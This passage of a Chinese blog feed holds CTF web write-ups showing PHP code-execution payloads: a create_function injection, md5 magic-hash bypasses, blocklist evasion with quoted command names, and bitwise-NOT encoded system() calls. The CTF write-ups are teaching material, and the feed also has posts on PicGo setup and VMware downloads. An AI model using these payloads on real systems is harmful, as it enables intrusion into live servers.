punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个正则是让第一个字符不能是小写字母数字或者下划线</p><p>看到<code>$a(&#39;&#39;,$b);</code>应该想到是<code>create_function</code>绕过</p><p>查看根目录文件</p><pre class="line-numbers language-none"><code class="language-none">a&#x3D;\create_function&amp;b&#x3D;return 1;&#125;system(&#39;ls &#x2F;&#39;);&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终payload：</p><pre class="line-numbers language-none"><code class="language-none">a&#x3D;\create_function&amp;b&#x3D;return 1;&#125;system(&#39;cat &#x2F;flag&#39;);&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="NSSCTF-2022-Spring-Recruit-babyphp"><a href="#NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babyphp"></a>[NSSCTF 2022 Spring Recruit]babyphp</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]/'</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b1'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c1'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"yee"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"nop"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"go on"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"let's get some php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>先过第一个if，需要a不含数字而且intval取整数</p></li><li><p>官方对intval的解释是</p></li></ul><pre class="line-numbers language-none"><code class="language-none">通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 intval() 不能用于 object，否则会产生 E_WARNING 错误并返回 1。 echo intval(array());                 &#x2F;&#x2F; 0echo intval(array(&#39;foo&#39;, &#39;bar&#39;));     &#x2F;&#x2F; 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>所以我们传入数组就能过掉第一个if</p><pre class="line-numbers language-none"><code class="language-none">a[]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>第三个if，由于md5函数无法处理数组,会返回nul</li></ul><pre class="line-numbers language-none"><code class="language-none">b1[]&#x3D;1&amp;b2[]&#x3D;12 md5(b1[]&#x3D;1) &#x3D;&#x3D;&#x3D; md5(b2[]&#x3D;1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>第四个if，需要传入值是字符串且md5值相等</li></ul><blockquote><p>弱判断下，0e开头的数等于0，所以使两端的md5值都为0e开头即可</p></blockquote><p>以下这些字符串，md5哈希之后都是0e开头的：</p><pre class="line-numbers language-none"><code class="language-none">QLTHNDT0e405967825401955372549139051580QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">c1&#x3D;QLTHNDT&amp;c2&#x3D;QNKCDZO<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以最终的payload是</p><pre class="line-numbers language-none"><code class="language-none">a[]&#x3D;1&amp;b1[]&#x3D;2&amp;b2[]&#x3D;12&amp;c1&#x3D;QLTHNDT&amp;c2&#x3D;QNKCDZO<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SWPUCTF-2021-新生赛-finalrce"><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h1><pre class="line-numbers language-none"><code class="language-none">preg_match(&#39;&#x2F;bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$&#x2F;i&#39;,$url)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没有过滤<code>‘</code>、<code>/</code>、<code>tee</code>、<code>tac</code>、<code>|</code>、空格</p><p>我们可以用<code>‘</code>绕过正则，但是exec不会回显，所以将文件输出到文本文档中</p><pre class="line-numbers language-none"><code class="language-none">url&#x3D;l&#39;s&#39; &#x2F; | tee 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问1.txt得到</p><p><img src="https://imag.keyblue.cn/imag/202309221052422.png" alt="image-20230922105206373"></p><p>注意到<code>la</code>被过滤了，用单引号绕过，payload如下</p><pre class="line-numbers language-none"><code class="language-none">url&#x3D;ca&#39;t&#39; &#x2F;flllll&#39;&#39;aaaaaaggggggg| tee 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309221058434.png" alt="image-20230922105834405"></p><h1 id="SWPUCTF-2021-新生赛-hardrce"><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h1><p>取反绕过</p><p>参考链接：</p><p><a href="https://www.fengnayun.com/news/content/53902.html">https://www.fengnayun.com/news/content/53902.html</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105656737">https://blog.csdn.net/qq_45521281/article/details/105656737</a></p><p>目的是<code>eval($wllm)</code>命令执行</p><p>先用php取反</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//%8C%86%8C%8B%9A%92</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//%93%8C%DF%D0</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造payload</p><pre class="line-numbers language-none"><code class="language-none">wllm&#x3D;(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309201908919.png" alt="image-20230920190851884"></p><p>再次取反构造payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'cat /flllllaaaaaaggggggg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98</span><span class="token comment">//payload:</span><span class="token comment">//wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;084648f0-6cf3-4604-8607-cf9b6a10aaeb&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="鹏城杯-2022-简单的php"><a href="#鹏城杯-2022-简单的php" class="headerlink" title="[鹏城杯 2022]简单的php"></a>[鹏城杯 2022]简单的php</h1><p>当php源码如下时</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">80</span> <span class="token keyword">or</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|&lt;|>|\$|\?|\^|&amp;|\|/is'</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' Hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\s\(\)]+?\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>第一个if限制字符在80以内且不能传字母数字，但没有过滤<code>[</code>、<code>]</code>、<code>!</code>、<code>%</code>、<code>;</code></p><p> preg_replace的过滤规则将限制函数不能有参数，也就是只能通过函数嵌套函数来达成目的</p><p>对于第一个if可以通过取反来绕过，第二个if可以使用二维数组的方式绕过，需要注意的是二维数组的分隔符是<code>[!%FF]</code>，有以下payload</p></blockquote><p> payload：</p><pre class="line-numbers language-none"><code class="language-none">[~%8F%97%8F%96%91%99%90][!%FF]();&#x2F;&#x2F;phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们知道：</p><blockquote><p>getallheaders()函数的作用时读取请求头并返回数组</p><p>end()的作用是返回数组的最后一个元素</p></blockquote><p>通过读取请求头就可以实现无参RCE</p><pre class="line-numbers language-none"><code class="language-none">对字符串取反：%8C%86%8C%8B%9A%92   &#x2F;&#x2F;system%9A%91%9B&#x2F;&#x2F;end%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C&#x2F;&#x2F;getallheaders<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">[~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));&#x2F;&#x2F;system(end(getallheaders()))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h1><p>参考：<a href="https://www.nssctf.cn/note/set/1953">https://www.nssctf.cn/note/set/1953</a></p><pre class="line-numbers language-none"><code class="language-none">案例网址：https:&#x2F;&#x2F;www.shawroot.cc&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo?username&#x3D;root$_SERVER[&#39;PHP_SELF&#39;] 得到：&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo$_SERVER[&#39;REQUEST_URI&#39;] 得到：&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo?username&#x3D;root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><code>$_SERVER[&#39;REQUEST_URI&#39;]</code>不会将参数中的特殊符号进行转换，<br><strong>也就是说它获取到的url上面的值，不会进行url解码</strong></p></blockquote><p>想要将show_source传递给index.php，而我们的目的是高亮显示utils.php，所以有如下payload</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php&#x2F;utils.php&#x2F;?show_source&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个正则匹配字符串末尾是否是<code>utils.php</code>，basename()函数的作用是返回最后一个<code>/</code>后面的字符，如果出现了非ascii字符就会丢弃</p><pre class="line-numbers language-none"><code class="language-none">preg_match(&#39;&#x2F;utils\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以有以下payload：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php&#x2F;utils.php&#x2F;%ff?show_source&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>匹配字符串中是否有<code>show_source</code>，php会把空格认为是<code>_</code>，而且<code>$_SERVER[&#39;REQUEST_URI&#39;])</code>不会进行url解码，将任意字符进行url编码也可以绕过</p><pre class="line-numbers language-none"><code class="language-none">preg_match(&#39;&#x2F;show_source&#x2F;&#39;, $_SERVER[&#39;REQUEST_URI&#39;])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终payload:</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php&#x2F;utils.php&#x2F;%ff?show%20source&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次信创系统下Typora+PicGo+华为云OBS，云图床配置</title>
      <link href="/2023/05/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BF%A1%E5%88%9B%E7%B3%BB%E7%BB%9F%E4%B8%8BTypora+picgo+%E5%8D%8E%E4%B8%BA%E4%BA%91OBS%EF%BC%8C%E4%BA%91%E5%9B%BE%E5%BA%8A%E9%85%8D%E7%BD%AE/"/>
      <url>/2023/05/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BF%A1%E5%88%9B%E7%B3%BB%E7%BB%9F%E4%B8%8BTypora+picgo+%E5%8D%8E%E4%B8%BA%E4%BA%91OBS%EF%BC%8C%E4%BA%91%E5%9B%BE%E5%BA%8A%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Typora + PicGO + 华为云OBS 。Typora Linux版配置PicGo 华为云OBS对象存储，使用Typora写笔记图片自动上传到华为云储存桶。</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>Linux</p><p>国产ARM架构CPU 飞腾2000</p><p>银河麒麟V10 SP1。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先安装Typora</p><p>在Typora官网下载LinuxARM版安装包<a href="https://typora.io/#linux">https://typora.io/#linux</a></p><p>解压缩安装包到&#x2F;opt目录下</p><pre class="line-numbers language-none"><code class="language-none">tar -zxvf Typora-linux-arm64.tar.gz &#x2F;opt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装node.js和npm</p><pre class="line-numbers language-none"><code class="language-none">sudo apt install nodejssudo apt install npm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装PicGo,仓库地址：<a href="https://github.com/PicGo/PicGo-Core">https://github.com/PicGo/PicGo-Core</a></p><pre class="line-numbers language-none"><code class="language-none">sudo npm install picgo -g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置PicGo-Core使用华为云OBS</p><p>华为云OBS的PicGo插件仓库地址：<a href="https://github.com/YunfengGao/picgo-plugin-huawei-uploader">https://github.com/YunfengGao/picgo-plugin-huawei-uploader</a></p><pre class="line-numbers language-none"><code class="language-none"># 进入该picgo安装文件夹(路径可能不一样，以自己的为准)cd &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;picgo&#x2F;bin&#x2F;# 安装插件.&#x2F;picgo install picgo-plugin-huawei-uploader# 配置插件参数.&#x2F;picgo set uploader<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下图配置信息，有4个必填项，</p><ul><li><p>第一个必填项为AccessKeyId</p></li><li><p>第二个必填项为SecretAccessKey</p></li><li><p>第三个必填项为桶名称</p></li><li><p>第四个必填项为Endpoint</p></li></ul><p><img src="https://imag.keyblue.cn/imag/202309031208306.png" alt="2023-06-08_14-10-42"></p><pre class="line-numbers language-none"><code class="language-none"># 选择huawei-uploader插件并应用.&#x2F;picgo use uploader<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>最后打开Typora偏好设置-&gt;图像，如下图配置即可</p><p><img src="https://imag.keyblue.cn/imag/202309031208291.png" alt="image-20230608141744671"></p><p>配置命令如下，具体路径根据具体情况更改</p><pre class="line-numbers language-none"><code class="language-none">&quot;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;picgo&#x2F;bin&#x2F;picgo&quot; u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后点击验证图片上传验证是否配置成功</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Typora </tag>
            
            <tag> PicGo </tag>
            
            <tag> 华为云OBS </tag>
            
            <tag> 信创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware Workstation Pro 虚拟机软件专业版</title>
      <link href="/2023/03/21/VMware%20Workstation%20Pro%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BD%AF%E4%BB%B6%E4%B8%93%E4%B8%9A%E7%89%88/"/>
      <url>/2023/03/21/VMware%20Workstation%20Pro%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BD%AF%E4%BB%B6%E4%B8%93%E4%B8%9A%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p>VMWare Workstation 是消费级虚拟机软件中的当之无愧的老大，无论从性能上还是周边的各种功能上都比其他产品要强大得多，如果你追求更全面的功能，更多的技术特性，那么你一定要试试 Workstation。<br><strong>下载地址</strong><br>VMware Workstation 17.0.1 Pro for Windows<br><a href="https://download3.vmware.com/software/WKST-1701-WIN/VMware-workstation-full-17.0.1-21139696.exe">https://download3.vmware.com/software/WKST-1701-WIN/VMware-workstation-full-17.0.1-21139696.exe</a></p><p>VMware Workstation 17.0.0 Pro for Windows<br><a href="https://download3.vmware.com/software/WKST-1700-WIN/VMware-workstation-full-17.0.0-20800274.exe">https://download3.vmware.com/software/WKST-1700-WIN/VMware-workstation-full-17.0.0-20800274.exe</a></p><p>VMware Workstation Pro 16.2.4 Build 20089737<br><a href="https://download3.vmware.com/software/WKST-1624-WIN/VMware-workstation-full-16.2.4-20089737.exe">https://download3.vmware.com/software/WKST-1624-WIN/VMware-workstation-full-16.2.4-20089737.exe</a></p><p>VMware Workstation Pro 16.2.3 Build 19376536<br><a href="https://download3.vmware.com/software/WKST-1623-WIN-New/VMware-workstation-full-16.2.3-19376536.exe">https://download3.vmware.com/software/WKST-1623-WIN-New/VMware-workstation-full-16.2.3-19376536.exe</a></p><p>VMware Workstation Pro 16.2.2 Build 19200509<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.2.2-19200509.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.2.2-19200509.exe</a></p><p>VMware Workstation Pro 16.2.0 Build 18760230<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.2.0-18760230.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.2.0-18760230.exe</a></p><p>VMware Workstation Pro 16.1.2 Build 17966106<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.1.2-17966106.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.1.2-17966106.exe</a></p><p>VMware Workstation Pro 16.1.1 Build 17801498<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.1.1-17801498.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.1.1-17801498.exe</a></p><p>VMware Workstation Pro 16.1.0 Build 17198959<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.1.0-17198959.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.1.0-17198959.exe</a></p><p>VMware Workstation Pro 16.0.0 Build 16894299<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.0.0-16894299.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.0.0-16894299.exe</a></p><p>VMware Workstation Pro 15.5.6 Build 16341506<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.6-16341506.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.6-16341506.exe</a></p><p>VMware Workstation Pro 15.5.5 Build 16285975<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.5-16285975.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.5-16285975.exe</a></p><p>VMware Workstation Pro 15.5.2 Build 15785246<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.2-15785246.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.2-15785246.exe</a></p><p>VMware Workstation Pro 15.5.1 Build 15018445<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.1-15018445.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.1-15018445.exe</a></p><p>VMware Workstation Pro 15.5.0 Build 14665864<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.0-14665864.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.0-14665864.exe</a></p><p>VMware Workstation Pro 15.1.0 Build 13591040<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.1.0-13591040.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.1.0-13591040.exe</a></p><p>VMware Workstation Pro 14.1.3 Build 9474260<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-14.1.3-9474260.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-14.1.3-9474260.exe</a></p><p>VMware Workstation Pro 12.5.9 Build 7535481<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-12.5.9-7535481.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-12.5.9-7535481.exe</a></p><p>VMware Workstation 10.0.7 Build 2844087<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-10.0.7-2844087.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-10.0.7-2844087.exe</a></p>]]></content>
      
      
      <categories>
          
          <category> 免费资源 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VMware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>W 校验数字签名时出错。此仓库未被更新，所以仍然使用此前的索引文件。GPG 错误：httpmirrors.ustc.edu.cnkali kali-rolling</title>
      <link href="/2023/02/26/W%20%E6%A0%A1%E9%AA%8C%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E6%97%B6%E5%87%BA%E9%94%99%E3%80%82%E6%AD%A4%E4%BB%93%E5%BA%93%E6%9C%AA%E8%A2%AB%E6%9B%B4%E6%96%B0%EF%BC%8C%E6%89%80%E4%BB%A5%E4%BB%8D%E7%84%B6%E4%BD%BF%E7%94%A8%E6%AD%A4%E5%89%8D%E7%9A%84%E7%B4%A2%E5%BC%95%E6%96%87%E4%BB%B6%E3%80%82GPG%20%E9%94%99%E8%AF%AF%EF%BC%9Ahttpmirrors.ustc.edu.cnkali%20kali-rolling/"/>
